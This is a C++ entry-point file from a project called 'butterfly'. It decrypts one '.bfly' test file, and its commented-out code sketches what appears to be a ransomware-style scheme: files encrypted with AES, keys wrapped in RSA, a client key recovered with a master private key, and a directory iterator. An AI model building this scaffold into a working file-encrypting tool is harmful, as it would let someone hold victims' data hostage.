
#include <memory>

#include "argumentParser.h"
#include "directoryIterator.h"
#include "crypto/encryptor.h"
#include "crypto/decryptor.h"

#include "crypto/aesEncryptor.h"
#include "crypto/aesDecryptor.h"

int main(int argc, char *argv[])
{

    // parse args with the argument parser
    std::unique_ptr<butterfly::ArgumentParser> argparse(new butterfly::ArgumentParser());
    butterfly::ArgumentParser::Arguments arg = argparse->parseArgs(argc, argv);

    LOG_INFO("Start application " << PROJECT_NAME << " with version " << arg._version);
    //std::shared_ptr<butterfly::DirectoryIterator> dirIterator(new butterfly::DirectoryIterator());

    /*
    // start encryption
    std::unique_ptr<butterfly::Encryptor> encryptor(new butterfly::Encryptor(2048));
    encryptor->encryptCPrivateRSA();

    encryptor->encryptAESKey();

    sleep(2);

    // start decryption
    std::unique_ptr<butterfly::Decryptor> decryptor(new butterfly::Decryptor());
    std::string cprivate = decryptor->decryptCPrivateRSA(
            "/home/christian/projects/butterfly/masterkeys/SPrivateRSA.pem");
    decryptor->decryptAESKey(cprivate);
    */

    /*
    std::unique_ptr<butterfly::AESEncryptor> aesEncryptor(new butterfly::AESEncryptor());
    //aesEncryptor->generateAESKey();
    std::string s = "/home/christian/projects/butterfly/bin/WiringPi.zip";
    aesEncryptor->encryptFile(s);
    */


    std::unique_ptr<butterfly::AESDecryptor> aesDecryptor(new butterfly::AESDecryptor());
    std::string s = "/home/christian/projects/butterfly/bin/WiringPi.zip.bfly";
    std::string sa = "test.pdf.dec";
    //aesDecryptor->decryptFile(&sa[0], &s[0]);
    aesDecryptor->decryptFile(s);

     return 0;
}